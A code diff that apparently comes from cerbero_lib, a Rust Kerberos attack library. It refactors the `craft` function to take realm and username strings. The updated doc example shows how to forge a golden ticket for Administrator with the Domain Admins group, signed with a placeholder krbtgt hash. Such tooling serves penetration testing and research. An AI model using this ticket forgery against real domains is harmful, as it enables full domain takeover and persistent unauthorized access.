@@ -10,33 +10,39 @@ use ms_pac::PISID;
 /// # Examples
 ///
 /// ```
-/// use cerbero_lib::{craft, CredFormat, EncryptionType, FileVault, Key, KrbUser, Vault, PISID};
+/// let vault = FileVault::new("tickets.ccache".to_string());
 ///
-/// fn main()
+/// let rid = 500;
+/// let sid = PISID::try_from("DOMAIN_SID").expect("Failed to convert SID");
+/// let group_rids = [512];
+///
+/// let krbtgt = Key::from_rc4_key_string("KRBTGT NT HASH").expect("Failed to convert krbtgt key");
+///
+/// match craft(
+///             "DOMAIN.COM",
+///             "Administrator",
+///             None,
+///             krbtgt,
+///             rid,
+///             sid,
+///             &group_rids,
+///             Some(EncryptionType::RC4),
+///             CredFormat::Ccache,
+///             &vault,
+/// )
 /// {
-///     let user = KrbUser::new("Administrator".to_string(), "DOMAIN.COM".to_string());
-///     let vault = FileVault::new("tickets.ccache".to_string());
-///
-///     let rid = 500;
-///     let sid = PISID::try_from("DOMAIN_SID").expect("Failed to convert SID");
-///     let group_rids = [512];
-///
-///     let krbtgt = Key::from_rc4_key_string("KRBTGT NT HASH").expect("Failed to convert krbtgt key");
-///
-///     match craft(user, None, krbtgt, rid, sid, &group_rids, Some(EncryptionType::RC4), CredFormat::Ccache, &vault)
+///     Ok(_) =>
 ///     {
-///         Ok(_) =>
+///         for ticket in vault.dump().expect("Failed to dump tickets").iter()
 ///         {
-///             for ticket in vault.dump().expect("Failed to dump tickets").iter()
-///             {
-///                 println!("{:?}", ticket);
-///             }
-///         },
-///         Err(e) => panic!("Failed to craft a golden ticket: {}", e),
-///     };
-/// }
+///             println!("{:?}", ticket);
+///         }
+///     },
+///     Err(e) => panic!("Failed to craft a golden ticket: {}", e),
+/// };
 /// ```
-pub fn craft(user: KrbUser,
+pub fn craft(realm: &str,
+             username: &str,
              service: Option<String>,
              ticket_key: Key,
              user_rid: u32,
@@ -47,6 +53,8 @@ pub fn craft(user: KrbUser,
              vault: &dyn Vault)
              -> Result<()>
 {
+	let user = KrbUser::new(username.to_string(), realm.to_string());
+
 	let ticket_info = craft_ticket_info(
 	                                    user,
 	                                    service.clone(),
